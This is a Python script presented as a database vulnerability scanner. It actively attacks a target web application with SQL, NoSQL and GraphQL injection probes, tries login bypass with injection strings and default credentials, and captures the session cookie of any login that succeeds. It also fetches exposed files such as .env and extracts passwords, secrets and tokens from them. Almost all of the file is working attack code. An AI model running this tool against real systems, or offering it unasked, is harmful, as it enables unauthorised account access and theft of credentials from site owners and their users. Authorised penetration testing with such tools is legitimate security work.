"""
ADVANCED DATABASE VULNERABILITY SCANNER
Detects SQLi, NoSQLi, GraphQL injection, Auth Bypass, and extracts credentials.
"""

import requests
import re
import json
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from exploit_db import PayloadDatabase

class DatabaseScanner:
    def __init__(self, target_url, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
        self.session = requests.Session()
        self.payload_db = PayloadDatabase()
        self.vulnerabilities = []
        self.extracted_credentials = []
        
    def detect_sql_injection(self):
        """Comprehensive SQL Injection Detection"""
        print("\n[*] Testing for SQL Injection vulnerabilities...")
        sqli_payloads = self.payload_db.sql_injection
        
        # Test URL parameters
        parsed = urlparse(self.target_url)
        if parsed.query:
            for param in parsed.query.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    test_url = self.target_url.replace(value, value + "'")
                    
                    try:
                        resp = self.session.get(test_url, timeout=self.timeout)
                        content = resp.text.lower()
                        
                        # Error signatures
                        error_patterns = [
                            "sql syntax", "mysql_fetch", "ORA-", "postgresql", 
                            "sqlite", "mssql", "syntax error", "unclosed quote"
                        ]
                        
                        for pattern in error_patterns:
                            if pattern in content:
                                vuln = {
                                    "type": "SQL Injection (Error-Based)",
                                    "location": "URL Parameter",
                                    "parameter": key,
                                    "payload": value + "'",
                                    "evidence": f"Found '{pattern}' in response",
                                    "cwe": "CWE-89",
                                    "severity": "CRITICAL"
                                }
                                self.vulnerabilities.append(vuln)
                                print(f"[!] CRITICAL: SQL Injection found in parameter '{key}'")
                                break
                    except Exception as e:
                        pass

        # Test POST forms
        try:
            resp = self.session.get(self.target_url, timeout=self.timeout)
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                action = form.get('action', '')
                if not action.startswith('http'):
                    action = urljoin(self.target_url, action)
                
                inputs = form.find_all('input')
                data = {}
                for inp in inputs:
                    name = inp.get('name')
                    if name:
                        data[name] = "test' OR '1'='1"
                
                if data:
                    for payload in sqli_payloads['error_based'][:3]: # Test first 3
                        test_data = {k: payload for k in data.keys()}
                        try:
                            post_resp = self.session.post(action, data=test_data, timeout=self.timeout)
                            content = post_resp.text.lower()
                            
                            error_patterns = ["sql syntax", "mysql_fetch", "ORA-", "postgresql"]
                            for pattern in error_patterns:
                                if pattern in content:
                                    vuln = {
                                        "type": "SQL Injection (Form)",
                                        "location": "POST Form",
                                        "action": action,
                                        "payload": payload,
                                        "evidence": f"Found '{pattern}' in response",
                                        "cwe": "CWE-89",
                                        "severity": "CRITICAL"
                                    }
                                    self.vulnerabilities.append(vuln)
                                    print(f"[!] CRITICAL: SQL Injection found in form at {action}")
                                    break
                        except:
                            pass
        except Exception as e:
            print(f"[-] Error testing forms: {e}")

    def detect_nosql_injection(self):
        """NoSQL Injection Detection (MongoDB)"""
        print("\n[*] Testing for NoSQL Injection...")
        nosql_payloads = self.payload_db.nosql_injection['mongodb']
        
        try:
            resp = self.session.get(self.target_url, timeout=self.timeout)
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                action = form.get('action', '')
                if not action.startswith('http'):
                    action = urljoin(self.target_url, action)
                
                # Try sending JSON payloads
                for payload in nosql_payloads:
                    try:
                        headers = {'Content-Type': 'application/json'}
                        post_resp = self.session.post(action, data=payload, headers=headers, timeout=self.timeout)
                        
                        # Check for success indicators or different behavior
                        if post_resp.status_code == 200 and len(post_resp.text) != len(resp.text):
                            # Heuristic: if response length changes significantly, might be vulnerable
                            if "login" in action.lower() or "auth" in action.lower():
                                vuln = {
                                    "type": "NoSQL Injection",
                                    "location": "JSON Body",
                                    "action": action,
                                    "payload": payload,
                                    "evidence": "Response length changed with NoSQL payload",
                                    "cwe": "CWE-943",
                                    "severity": "HIGH"
                                }
                                self.vulnerabilities.append(vuln)
                                print(f"[!] HIGH: Potential NoSQL Injection at {action}")
                    except:
                        pass
        except Exception as e:
            pass

    def detect_graphql_injection(self):
        """GraphQL Vulnerability Detection"""
        print("\n[*] Scanning for GraphQL endpoints and vulnerabilities...")
        graphql_paths = ['/graphql', '/graphiql', '/api/graphql', '/v1/graphql']
        
        for path in graphql_paths:
            test_url = urljoin(self.target_url, path)
            try:
                # Test introspection
                query = '{"query": "{ __schema { types { name } } }"}'
                resp = self.session.post(test_url, data=query, 
                                         headers={'Content-Type': 'application/json'}, 
                                         timeout=self.timeout)
                
                if resp.status_code == 200:
                    try:
                        json_resp = resp.json()
                        if 'data' in json_resp and '__schema' in str(json_resp):
                            vuln = {
                                "type": "GraphQL Introspection Enabled",
                                "location": test_url,
                                "evidence": "Schema exposed via introspection",
                                "cwe": "CWE-200",
                                "severity": "MEDIUM"
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"[!] MEDIUM: GraphQL Introspection enabled at {test_url}")
                            
                            # Test batch attack
                            batch_query = '[{"query": "{ __typename }"}, {"query": "{ __typename }"}]'
                            batch_resp = self.session.post(test_url, data=batch_query,
                                                           headers={'Content-Type': 'application/json'},
                                                           timeout=self.timeout)
                            if batch_resp.status_code == 200:
                                vuln_batch = {
                                    "type": "GraphQL Batch Attack Possible",
                                    "location": test_url,
                                    "evidence": "Server accepts batched queries (DoS risk)",
                                    "cwe": "CWE-400",
                                    "severity": "MEDIUM",
                                    "cve": "CVE-2026-2045"
                                }
                                self.vulnerabilities.append(vuln_batch)
                                print(f"[!] MEDIUM: GraphQL Batch vulnerability (CVE-2026-2045)")
                    except:
                        pass
            except:
                pass

    def test_authentication_bypass(self):
        """Advanced Authentication Bypass Testing"""
        print("\n[*] Testing Authentication Bypass techniques...")
        
        try:
            resp = self.session.get(self.target_url, timeout=self.timeout)
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            
            bypass_payloads = [
                {"username": "admin'--", "password": "anything"},
                {"username": "admin", "password": "' OR '1'='1"},
                {"username": "admin", "password": ""},
                {"username": "admin'/*", "password": "*/OR 1=1--"},
                {"username": "administrator", "password": "administrator"},
                {"username": "root", "password": "root"}
            ]
            
            for form in forms:
                action = form.get('action', '')
                if not action.startswith('http'):
                    action = urljoin(self.target_url, action)
                
                # Only test login-like forms
                if any(x in action.lower() for x in ['login', 'auth', 'signin', 'session']):
                    inputs = form.find_all('input')
                    field_names = {}
                    for inp in inputs:
                        name = inp.get('name', '').lower()
                        if 'user' in name or 'email' in name or 'name' in name:
                            field_names['user'] = inp.get('name')
                        if 'pass' in name:
                            field_names['pass'] = inp.get('name')
                    
                    if 'user' in field_names and 'pass' in field_names:
                        for payload in bypass_payloads:
                            data = {
                                field_names['user']: payload['username'],
                                field_names['pass']: payload['password']
                            }
                            
                            try:
                                bypass_resp = self.session.post(action, data=data, timeout=self.timeout, allow_redirects=False)
                                
                                # Check for successful bypass indicators
                                if bypass_resp.status_code == 302 or 'dashboard' in bypass_resp.text.lower() or 'welcome' in bypass_resp.text.lower():
                                    if 'set-cookie' in str(bypass_resp.headers).lower() and 'session' in str(bypass_resp.headers).lower():
                                        cred = {
                                            "type": "Authentication Bypass Successful",
                                            "location": action,
                                            "username_used": payload['username'],
                                            "password_used": payload['password'],
                                            "extracted_session": bypass_resp.headers.get('Set-Cookie', '')[:100],
                                            "severity": "CRITICAL"
                                        }
                                        self.extracted_credentials.append(cred)
                                        self.vulnerabilities.append({
                                            "type": "Auth Bypass",
                                            "location": action,
                                            "payload": payload,
                                            "cwe": "CWE-287",
                                            "severity": "CRITICAL"
                                        })
                                        print(f"[!!!] CRITICAL: AUTH BYPASS SUCCESSFUL!")
                                        print(f"     Username: {payload['username']}")
                                        print(f"     Password: {payload['password']}")
                                        print(f"     Session: {cred['extracted_session']}")
                                        return # Stop after first success
                            except:
                                pass
        except Exception as e:
            pass

    def check_sensitive_exposure(self):
        """Check for exposed sensitive files and database configs"""
        print("\n[*] Checking for sensitive file exposure...")
        sensitive_files = self.payload_db.sensitive_files
        
        for file in sensitive_files:
            test_url = urljoin(self.target_url, file)
            try:
                resp = self.session.get(test_url, timeout=self.timeout)
                if resp.status_code == 200 and len(resp.text) > 50:
                    # Check for actual sensitive content
                    content = resp.text
                    if 'password' in content.lower() or 'secret' in content.lower() or 'key' in content.lower() or 'db_' in content.lower():
                        vuln = {
                            "type": "Sensitive File Exposure",
                            "file": file,
                            "url": test_url,
                            "evidence": "File accessible and contains sensitive keywords",
                            "cwe": "CWE-538",
                            "severity": "HIGH"
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] HIGH: Sensitive file exposed: {test_url}")
                        
                        # Extract credentials if .env
                        if file == '.env':
                            for line in content.split('\n'):
                                if '=' in line and not line.startswith('#'):
                                    key, val = line.split('=', 1)
                                    if any(x in key.lower() for x in ['pass', 'secret', 'key', 'token', 'db']):
                                        self.extracted_credentials.append({
                                            "type": "Environment Variable Leak",
                                            "key": key.strip(),
                                            "value": val.strip(),
                                            "source": test_url
                                        })
            except:
                pass

    def run_full_scan(self):
        """Execute all database vulnerability tests"""
        self.detect_sql_injection()
        self.detect_nosql_injection()
        self.detect_graphql_injection()
        self.test_authentication_bypass()
        self.check_sensitive_exposure()
        
        return {
            "vulnerabilities": self.vulnerabilities,
            "extracted_credentials": self.extracted_credentials
        }
